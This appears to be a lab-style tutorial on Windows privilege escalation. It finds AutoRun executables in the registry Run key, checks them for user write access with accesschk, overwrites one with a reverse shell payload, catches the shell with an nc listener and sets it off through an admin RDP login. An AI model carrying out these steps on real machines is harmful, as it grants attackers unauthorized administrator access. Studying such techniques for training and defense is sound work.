
---

### 🧭 **What is AutoRun?**

Windows uses certain **registry keys** (like `Run`) to launch programs **automatically at startup or when someone logs in**. If one of those programs is writable by standard users, you can replace it with your **reverse shell** to gain higher privileges when the system starts or an admin logs in.

---

### 🔍 **Step 1: View AutoRun Programs in the Registry**

```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

- **What it does:** Lists programs set to run automatically for **all users** when Windows starts or someone logs in.
    
- **Look for:** A path like this:
    
    ```
    C:\Program Files\Autorun Program\program.exe
    ```
    

---

### 🔐 **Step 2: Check If the File is Writable**

```bash
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
```

- **What it does:** Checks if non-admin users can **write to the executable**.
    
- **Why:** If the program is writable, you can **replace it** with your malicious `reverse.exe`.
    

---

### 🛠️ **Step 3: Replace the AutoRun Program**

```bash
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y
```

- **What it does:** Replaces the legitimate AutoRun program with your **reverse shell payload**.
    
- **Why:** When the system boots or an admin logs in, **your reverse shell will be executed**.
    

---

### 🎧 **Step 4: Start a Listener on Kali**

```bash
nc -lvnp 4444
```

- **Why:** This lets you **catch the reverse shell** once it runs.
    
- Make sure `reverse.exe` connects back to the right IP and port.
    

---

### 🔁 **Step 5: Trigger the Payload**

```bash
rdesktop MACHINE_IP
```

- **What it does:** Opens an RDP session to the Windows machine.
    
- **Why:** Logging in as **admin** will trigger the AutoRun entry — and since you replaced it with `reverse.exe`, **you'll get a reverse shell as admin**.
    
- **Note:** In a real-world scenario, you'd wait for an admin to log in on their own.
    

---
